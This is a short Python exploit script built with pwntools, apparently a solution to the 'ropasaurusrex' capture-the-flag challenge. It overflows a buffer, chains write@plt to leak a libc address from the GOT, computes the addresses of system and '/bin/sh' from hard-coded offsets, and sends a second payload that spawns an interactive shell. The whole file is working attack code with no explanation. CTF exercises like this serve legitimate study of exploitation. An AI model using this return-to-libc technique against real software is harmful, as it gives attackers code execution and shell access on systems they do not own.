from pwn import *
import struct

p = process('./ropasaurusrex')

payload = 'AAAA'*35

writeplt = 0x0804830c
readgot = 0x0804961c
vuln = 0x80483f4

payload += struct.pack("<I", writeplt)
payload += struct.pack("<I", vuln)
payload += struct.pack("<I", 1)
payload += struct.pack("<I", readgot)
payload += struct.pack("<I", 4)

p.sendline(payload)

leak = struct.unpack("<I", p.recv(4))[0]

system = leak - 633824
binsh = leak + 548523

payload = "AAAA"*35
payload += struct.pack("<I", system)
payload += struct.pack("<I", 0x41414141)
payload += struct.pack("<I", binsh)

p.sendline(payload)

p.interactive()
